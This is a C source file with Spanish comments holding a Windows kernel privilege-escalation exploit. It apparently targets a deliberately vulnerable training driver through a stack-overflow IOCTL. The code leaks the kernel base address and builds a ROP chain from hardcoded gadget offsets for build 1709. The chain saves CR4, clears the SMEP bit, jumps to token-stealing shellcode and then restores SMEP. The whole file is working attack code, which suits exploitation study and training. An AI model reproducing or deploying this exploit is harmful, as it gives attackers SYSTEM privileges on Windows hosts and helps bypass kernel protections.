#include <stdio.h>
#include <windows.h>




extern void TokenStealing1709();

char info_control_registers[300];

extern char * ptr_info_control_registers = &info_control_registers;

typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemBasicInformation = 0,
	SystemPerformanceInformation = 2,
	SystemTimeOfDayInformation = 3,
	SystemProcessInformation = 5,
	SystemProcessorPerformanceInformation = 8,
	SystemModuleInformation = 11,
	SystemInterruptInformation = 23,
	SystemExceptionInformation = 33,
	SystemRegistryQuotaInformation = 37,
	SystemLookasideInformation = 45
} SYSTEM_INFORMATION_CLASS;

typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY {
	HANDLE Section;
	PVOID MappedBase;
	PVOID ImageBase;
	ULONG ImageSize;
	ULONG Flags;
	USHORT LoadOrderIndex;
	USHORT InitOrderIndex;
	USHORT LoadCount;
	USHORT OffsetToFileName;
	UCHAR FullPathName[256];
} SYSTEM_MODULE_INFORMATION_ENTRY, *PSYSTEM_MODULE_INFORMATION_ENTRY;

typedef struct _SYSTEM_MODULE_INFORMATION {
	ULONG NumberOfModules;
	SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

typedef NTSTATUS(NTAPI *_NtQuerySystemInformation)(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
	);




ULONG64 GetKernelBase()
{
	DWORD len;
	PSYSTEM_MODULE_INFORMATION ModuleInfo;
	ULONG64 kernelBase = 0;

	_NtQuerySystemInformation NtQuerySystemInformation = (_NtQuerySystemInformation)
		GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQuerySystemInformation");
	if (NtQuerySystemInformation == NULL) {
		exit(1);
	}

	NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);
	ModuleInfo = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!ModuleInfo)
	{
		exit(1);
	}

	NtQuerySystemInformation(SystemModuleInformation, ModuleInfo, len, &len);

	kernelBase = (ULONG64)ModuleInfo->Module[0].ImageBase;
	VirtualFree(ModuleInfo, 0, MEM_RELEASE);

	return kernelBase;
}




HANDLE get_driver_handle(LPCSTR driverName)
{

	HANDLE hDriver = CreateFile(driverName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hDriver == INVALID_HANDLE_VALUE)
	{
		printf("No pude obtener el handle al driver.\nError code:%d\n", GetLastError());
		exit(1);
	}


	return hDriver;

}



int main(int argc, char** argv)
{




	LPCSTR driverName = (LPCSTR)"\\\\.\\EXAMPLE_DRIVER";

	DWORD IOCTL_STACK_BUFFER_OVERFLOW = 0x00222000;

	DWORD inBufferSize = 632;

	DWORD outBufferSize = 0x100;

	DWORD bytesReturned = 0;



	HANDLE hDriver = get_driver_handle(driverName);


	LPVOID inBuffer = VirtualAlloc(NULL, 0x256, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	LPVOID outBuffer = VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	
	LPVOID Payload = &TokenStealing1709;

	if (inBuffer == NULL)
	{
		return 1;
	}

	if (outBuffer == NULL)
	{
		return 1;
	}


	
	ULONG64 kernelBase = GetKernelBase();
	
	printf("kernelBase: %p \n", (PVOID)kernelBase);

	
	
		

	//1709

	ULONG64 poprcx = kernelBase + 0xdb8f; // 0x14000db8f: pop rcx ; ret  ;  (1 found)
	ULONG64 payload_rcx0 = (ULONG64)ptr_info_control_registers;// 0x406f8;
	ULONG64 get_control_registers_info = kernelBase + 0x163a00; // KiSaveInitialProcessorControlState 5e4a00
	ULONG64 poprax = kernelBase + 0x0288a6; //0x140013dc4: pop rax ; ret  ;  (1 found) //// 0x1400288a6: pop rax ; ret  ;  (1 found)
	ULONG64 poprdx = kernelBase + 0x6edcd2;//0x1406edcd2: pop rdx ; ret  ;  (1 found)
	ULONG64 payload_cero = 0;
	ULONG64 andecx_eax = kernelBase + 0x0a3dc3;//0x1400a3dc3: and ecx, eax ; mov rax, 0xFFFFF68000000000 ; add rax, rcx ; ret  ;  (1 found)
	ULONG64 payload_bitmask_smep = 0xFFFFFFFFFFEFFFFF;
	ULONG64 cr4_to_rax = kernelBase + 0x2BB1F;// --- 0x14002bb1f: mov rax, dword [rcx+0x18] ; ret  ;  (1 found)
	ULONG64 movecx_to_cr4 = kernelBase + 0x76a02; //0x140076a02: mov cr4, ecx ; ret  ;  (1 found) cr4 deshabilitado
	ULONG64 ret = poprcx + 1;

	
	
	memset(inBuffer, 0x41, 256); // Basura
	memset((((char*)inBuffer) + 256), 0x42, 8); //RBP

	memcpy((((char*)inBuffer) + 264), &poprcx, 8); // Inicio ROP
	memcpy((((char*)inBuffer) + 272), &payload_rcx0, 8); //  Meto ptr donde se va a guardar cr4

	memcpy((((char*)inBuffer) + 280), &get_control_registers_info, 8); // Guardo cr4 en info_control_registers

	memcpy((((char*)inBuffer) + 288), &cr4_to_rax, 8); //  cr4 to eax

	memcpy((((char*)inBuffer) + 296), &poprcx, 8); // Pongo rax=0
	memcpy((((char*)inBuffer) + 304), &payload_bitmask_smep, 8); //  cr4 to eax

	memcpy((((char*)inBuffer) + 312), &andecx_eax, 8); // Pongo rax=0

	memcpy((((char*)inBuffer) + 320), &movecx_to_cr4, 8); // Desactivo SMEP!


	memcpy((((char*)inBuffer) + 328), &Payload, 8); // Salto a mi shellcode!

	memcpy((((char*)inBuffer) + 336), &movecx_to_cr4, 8); // Activo SMEP!



	memcpy((((char*)inBuffer) + 344), &ret, 8); // Go back!
	memcpy((((char*)inBuffer) + 352), &ret, 8); // Go back!
	memcpy((((char*)inBuffer) + 360), &ret, 8); // Go back!
	memcpy((((char*)inBuffer) + 368), &ret, 8); // Go back!
	memcpy((((char*)inBuffer) + 376), &ret, 8); // Go back!
	memcpy((((char*)inBuffer) + 384), &ret, 8); // Go back!
	memcpy((((char*)inBuffer) + 392), &ret, 8); // Go back!
	memcpy((((char*)inBuffer) + 400), &ret, 8); // Go back!
	memcpy((((char*)inBuffer) + 408), &ret, 8); // Go back!
	memcpy((((char*)inBuffer) + 416), &ret, 8); // Go back!
	memcpy((((char*)inBuffer) + 424), &ret, 8); // Go back!
	memcpy((((char*)inBuffer) + 432), &ret, 8); // Go back!
	memcpy((((char*)inBuffer) + 440), &ret, 8); // Go back!
	
	memcpy((((char*)inBuffer) + 448), &ret, 8); // Go back!
	memcpy((((char*)inBuffer) + 456), &ret, 8); // Go back!
	memcpy((((char*)inBuffer) + 464), &ret, 8); // Go back!
	memcpy((((char*)inBuffer) + 472), &ret, 8); // Go back!
	memcpy((((char*)inBuffer) + 480), &ret, 8); // Go back!
	memcpy((((char*)inBuffer) + 488), &ret, 8); // Go back!
	memcpy((((char*)inBuffer) + 496), &ret, 8); // Go back!
	memcpy((((char*)inBuffer) + 504), &ret, 8); // Go back!
	memcpy((((char*)inBuffer) + 512), &ret, 8); // Go back!

	memcpy((((char*)inBuffer) + 520), &ret, 8); // Go back!
	memcpy((((char*)inBuffer) + 528), &ret, 8); // Go back!
	memcpy((((char*)inBuffer) + 536), &ret, 8); // Go back!
	memcpy((((char*)inBuffer) + 544), &ret, 8); // Go back!
	memcpy((((char*)inBuffer) + 552), &ret, 8); // Go back!
	memcpy((((char*)inBuffer) + 560), &ret, 8); // Go back!
	memcpy((((char*)inBuffer) + 568), &ret, 8); // Go back!
	memcpy((((char*)inBuffer) + 576), &ret, 8); // Go back!
	memcpy((((char*)inBuffer) + 584), &ret, 8); // Go back!
	
	memcpy((((char*)inBuffer) + 592), &ret, 8); // Go back!
	memcpy((((char*)inBuffer) + 600), &ret, 8); // Go back!
	memcpy((((char*)inBuffer) + 608), &ret, 8); // Go back!
	memcpy((((char*)inBuffer) + 616), &ret, 8); // Go back!
	memcpy((((char*)inBuffer) + 624), &ret, 8); // Go back!
	
	



	DeviceIoControl(hDriver, IOCTL_STACK_BUFFER_OVERFLOW, inBuffer, inBufferSize, outBuffer, outBufferSize, &bytesReturned, 0);


	getc(stdin);


	CloseHandle(hDriver);







	return 0;
}